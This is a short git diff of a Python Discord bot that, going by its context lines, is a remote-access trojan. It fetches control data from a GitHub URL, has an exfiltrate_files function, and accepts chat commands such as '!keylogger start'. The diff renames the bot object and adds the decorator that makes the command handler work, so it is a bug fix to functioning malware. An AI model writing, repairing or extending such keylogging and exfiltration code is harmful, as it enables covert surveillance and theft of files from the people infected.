@@ -27,7 +27,7 @@ BOT_CONTROL_URL = "https://raw.githubusercontent.com/Elissa1610/bot-host/refs/he
 
 intents = discord.Intents.default()
 intents.message_content = True
-client = commands.Bot(command_prefix="!", intents=intents)
+bot = commands.Bot(command_prefix="!", intents=intents)
 
 # Initialize logging
 logging.basicConfig(level=logging.DEBUG)
@@ -186,8 +186,9 @@ def exfiltrate_files():
         logging.error(f"File exfiltration failed: {e}")
 
 # Function to execute commands based on input
+@bot.event
 async def on_message(message):
-    if message.author == client.user:
+    if message.author == bot.user:
         return
 
     if message.content.startswith("!keylogger start"):
@@ -311,7 +312,7 @@ async def on_message(message):
         send_to_discord(f"Unknown command: {message.content}")
 
 async def setup():
-    await client.start(TOKEN)
+    await bot.start(TOKEN)
 
 # Main loop
 if __name__ == '__main__':
